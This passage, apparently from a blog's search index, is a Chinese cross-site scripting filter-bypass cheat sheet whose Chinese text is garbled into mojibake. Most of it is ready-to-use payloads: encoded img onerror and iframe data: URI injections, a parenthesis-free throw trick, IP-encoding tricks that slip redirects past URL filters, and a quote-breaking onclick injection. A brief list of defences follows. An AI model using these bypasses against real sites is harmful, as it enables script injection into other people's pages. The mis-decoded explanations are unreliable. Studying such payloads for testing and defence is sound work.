src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;urlç¼–ç ç»•è¿‡&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;Asciiç ç»•è¿‡&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;Hexç»•è¿‡&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;å…«è¿›åˆ¶ç»•è¿‡&lt;img src=x onerror=alert(&#39;\170\163\163&#39;)&gt;base64ç»•è¿‡&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p>è¿‡æ»¤åŒå¼•å·ï¼Œå•å¼•å·</p><pre><code>å¦‚æœæ˜¯htmlæ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨å¼•å·ï¼›å¦‚æœæ˜¯åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·&lt;img src=&quot;x&quot; onerror=alert(``xss``);&gt;ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼Œå…·ä½“çœ‹ä¸Šé¢åˆ—ä¸¾çš„ä¾‹å­</code></pre><p>è¿‡æ»¤æ‹¬å·</p><pre><code>å½“æ‹¬å·è¢«è¿‡æ»¤çš„æ—¶å€™å¯ä»¥ä½¿ç”¨throwæ¥ç»•è¿‡&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;</code></pre><p>è¿‡æ»¤urlåœ°å€</p><pre><code>ä½¿ç”¨urlç¼–ç &lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;ä½¿ç”¨IP&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;åè¿›åˆ¶&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;å…«è¿›åˆ¶&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;åå…­è¿›åˆ¶&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;htmlæ ‡ç­¾ä¸­ç”¨//å¯ä»¥ä»£æ›¿http://ä½¿ç”¨\ (æ³¨æ„ï¼šåœ¨windowsä¸‹\æœ¬èº«å°±æœ‰ç‰¹æ®Šç”¨é€”ï¼Œæ˜¯ä¸€ä¸ªpath çš„å†™æ³•ï¼Œæ‰€ä»¥\åœ¨Windowsä¸‹æ˜¯fileåè®®ï¼Œåœ¨linuxä¸‹æ‰ä¼šæ˜¯å½“å‰åŸŸçš„åè®®)ä½¿ç”¨ä¸­æ–‡é€—å·ä»£æ›¿è‹±æ–‡é€—å·&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www.baidu.com``&quot;&gt;//ä¼šè‡ªåŠ¨è·³è½¬åˆ°ç™¾åº¦</code></pre><p>htmlspecialchars() å‡½æ•°å®ä½“åŒ–HTML</p><pre><code>q&#39; onclick=&#39;alert(123)    //æ²¡æœ‰å®ä½“åŒ–å¼•å·çš„æƒ…å†µä¸‹</code></pre><p>æ³¨ï¼šinnerHtmlä¸ä¼šæ‰§è¡Œscriptå’Œsvgæ ‡ç­¾</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p><p>æ‹“å±•é“¾æ¥ï¼š<a href="https://blog.csdn.net/hackzkaq/article/details/126344040">https://blog.csdn.net/hackzkaq/article/details/126344040</a></p><p>xssé˜²å¾¡ï¼š</p><p>â€‹1ã€è¿‡æ»¤</p><p>â€‹2ã€httponly -&gt;è®©jsæ— æ³•è¯»å–åˆ°httponlyä¿æŠ¤çš„cookieå­—æ®µï¼ˆå¯ä»¥æ‰¾åˆ°æ¢é’ˆphpinfoï¼‰</p><p>â€‹3ã€HTMLå®ä½“åŒ–ï¼ˆè½¬ä¹‰ï¼‰</p>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
